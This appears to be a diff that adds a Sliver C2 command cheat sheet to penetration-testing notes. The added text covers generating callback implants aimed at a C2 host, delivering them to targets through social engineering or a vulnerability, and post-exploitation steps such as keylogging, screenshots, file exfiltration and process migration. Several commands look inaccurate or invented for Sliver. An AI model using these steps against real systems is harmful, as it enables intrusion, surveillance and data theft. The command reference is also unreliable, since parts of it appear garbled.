@@ -108,3 +108,182 @@ chisel client 10.10.16.14:1337 R:socks
 ```shell-session
 socks5 start -P 9050
 ```
+
+
+## Command Examples:
+
+The Sliver C2 framework is a powerful and flexible post-exploitation command and control tool. Here is a list of common commands you can use with Sliver for generating payloads and performing post-exploitation activities. Note that the exact commands may vary depending on the version of Sliver you are using. For the most up-to-date information, consult the official Sliver documentation or use the help commands within the Sliver console.
+
+### Payload Generation Commands
+
+1. **Generate an HTTP payload**:
+   ```bash
+   generate --http --host <C2_HOST> --port <C2_PORT> --save <FILENAME>
+   ```
+
+2. **Generate an HTTPS payload**:
+   ```bash
+   generate --https --host <C2_HOST> --port <C2_PORT> --save <FILENAME>
+   ```
+
+3. **Generate a DNS payload**:
+   ```bash
+   generate --dns --host <C2_HOST> --port <C2_PORT> --save <FILENAME>
+   ```
+
+4. **Generate a TCP payload**:
+   ```bash
+   generate --tcp --host <C2_HOST> --port <C2_PORT> --save <FILENAME>
+   ```
+
+5. **Generate a stageless payload**:
+   ```bash
+   generate --stageless --http --host <C2_HOST> --port <C2_PORT> --save <FILENAME>
+   ```
+
+6. **Generate a payload for a specific platform**:
+   ```bash
+   generate --http --host <C2_HOST> --port <C2_PORT> --save <FILENAME> --platform <PLATFORM>
+   ```
+
+### Post-Exploitation Commands
+
+1. **List active sessions**:
+   ```bash
+   sessions
+   ```
+
+2. **Interact with a session**:
+   ```bash
+   use <SESSION_ID>
+   ```
+
+3. **Execute a command on the target system**:
+   ```bash
+   shell <COMMAND>
+   ```
+
+4. **Upload a file to the target system**:
+   ```bash
+   upload <LOCAL_FILE> <REMOTE_PATH>
+   ```
+
+5. **Download a file from the target system**:
+   ```bash
+   download <REMOTE_FILE> <LOCAL_PATH>
+   ```
+
+6. **List files in a directory on the target system**:
+   ```bash
+   ls <REMOTE_DIRECTORY>
+   ```
+
+7. **Change directory on the target system**:
+   ```bash
+   cd <REMOTE_DIRECTORY>
+   ```
+
+8. **Capture a screenshot from the target system**:
+   ```bash
+   screenshot
+   ```
+
+9. **Record keystrokes on the target system**:
+   ```bash
+   keylogger start
+   ```
+
+10. **Stop recording keystrokes on the target system**:
+    ```bash
+    keylogger stop
+    ```
+
+11. **Retrieve recorded keystrokes**:
+    ```bash
+    keylogger dump
+    ```
+
+12. **List processes running on the target system**:
+    ```bash
+    ps
+    ```
+
+13. **Kill a process on the target system**:
+    ```bash
+    kill <PROCESS_ID>
+    ```
+
+14. **Migrate the implant to another process**:
+    ```bash
+    migrate <PROCESS_ID>
+    ```
+
+15. **Run a built-in command (e.g., port scan, file search)**:
+    ```bash
+    run <COMMAND>
+    ```
+
+16. **Execute a script on the target system**:
+    ```bash
+    execute <SCRIPT_PATH>
+    ```
+
+17. **Spawn a new shell on the target system**:
+    ```bash
+    spawn <SHELL_TYPE>
+    ```
+
+18. **Check the implant's status and configuration**:
+    ```bash
+    status
+    ```
+
+### Example Workflow
+
+1. **Generate a payload**:
+   ```bash
+   generate --https --host 192.168.1.10 --port 443 --save payload.exe
+   ```
+
+2. **Launch the payload on the target system** (e.g., by using social engineering or a vulnerability).
+
+3. **List active sessions**:
+   ```bash
+   sessions
+   ```
+
+4. **Interact with the active session**:
+   ```bash
+   use 1
+   ```
+
+5. **Perform post-exploitation activities** (e.g., uploading/downloading files, executing commands):
+   ```bash
+   shell whoami
+   upload C:\local\file.txt C:\remote\file.txt
+   download C:\remote\file.txt C:\local\file.txt
+   ```
+
+### Useful Built-in Commands
+
+1. **Port scan**:
+   ```bash
+   run portscan <TARGET_IP> <PORT_RANGE>
+   ```
+
+2. **Search for files**:
+   ```bash
+   run search -d <DIRECTORY> -p <PATTERN>
+   ```
+
+3. **Gather system information**:
+   ```bash
+   run sysinfo
+   ```
+
+4. **Gather network information**:
+   ```bash
+   run netinfo
+   ```
+
+These commands provide a good starting point for using the Sliver C2 framework for both payload generation and post-exploitation activities. Always refer to the official Sliver documentation for the most accurate and comprehensive information.
